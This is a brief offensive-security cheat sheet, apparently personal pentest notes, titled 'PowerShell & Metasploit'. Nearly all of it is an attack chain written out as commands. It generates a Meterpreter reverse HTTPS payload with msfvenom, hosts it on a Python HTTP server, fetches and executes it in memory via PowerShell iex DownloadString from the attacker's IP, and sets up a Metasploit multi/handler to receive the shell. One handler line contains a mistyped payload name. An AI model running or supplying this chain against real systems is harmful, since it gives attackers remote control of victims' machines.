
# PowerShell & Metasploit

**Flow** 
Create a reverse shell script using msfvenom and get it using powershell iex then execute it while the metasploit listening

___

Create The reverse shell

> msfvenom -p windows/x64/meterpreter_reverse_https lport=443 lhost=192.168.x.x  -f psh-reflection > payload.ps1

Create local server to share the file

> python -m SimpleHTTPServer 80

Request the script 

> powershell iex (New-Object Net.Webclient).DownloadString('http://192.168.x.x/payload.ps1')


Setup connection Metasploit

> use exploit/multi/handler

> set payload windows/x64/meterpreter_reverse_httpx

> set LHOST 192.168.x.2

> set LPORT 443

> exploit 

